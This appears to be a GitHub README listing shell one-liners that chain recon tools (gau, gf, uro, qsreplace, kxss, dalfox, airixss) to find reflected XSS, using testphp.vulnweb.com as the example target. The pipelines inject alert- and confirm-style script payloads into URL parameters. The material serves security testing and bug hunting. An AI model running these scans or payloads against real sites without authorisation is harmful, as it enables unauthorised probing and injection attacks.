# One-liner-XSS-Scanner-
This is a collection of commands that's help you to find XSS via automation.

##Via Bash Script
### Tools:
> [Kxss](https://github.com/Emoe/kxss) : To find reflected values.\n
> [uro](https://github.com/s0md3v/uro): Declutters url lists for crawling.\n
> [gf](https://github.com/tomnomnom/gf): A wrapper around grep, to help you grep for things.\n
> [qsreplace](https://github.com/tomnomnom/qsreplace): To replace all query string values with a user-supplied value.
> [Freq](https://github.com/takshal/freq): To find alert values.
> [airixss](https://github.com/ferreiraklet/airixss): To find XSS during recon.
> [dalfox](https://github.com/hahwul/dalfox) : It’s a powerfull XSS scanner.

## First Case

```
echo http://testphp.vulnweb.com | gau | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
```


![1_HTuqyTBftAdkwqfRL3jQ_w](https://github.com/0xElkot/One-liner-XSS-Scanner-/assets/58730198/b7975f46-d5ce-4adb-9f35-87d6b7af9294)


```
cat param.txt | kxss | awk '{print $9}'| dalfox pipe
```


![1_FO3algvVNFOrDIYh7wKbVQ](https://github.com/0xElkot/One-liner-XSS-Scanner-/assets/58730198/fbf15891-47df-43fe-a47a-aefc64c6493b)


```


cat param.txt | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
echo http://testphp.vulnweb.com | gau | gf xss | uro  |qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"


```

![1__JCZZJX2T1XiHxH0FZPTWw](https://github.com/0xElkot/One-liner-XSS-Scanner-/assets/58730198/cfb1baa0-f59c-4447-9753-093fd6b62c77)



*You can Read the full methodology here at [Medium](https://0xelkot.medium.com/advanced-xss-discovery-streamlining-your-attack-strategy-with-cutting-edge-automation-tools-88cfd0f68c8e)*
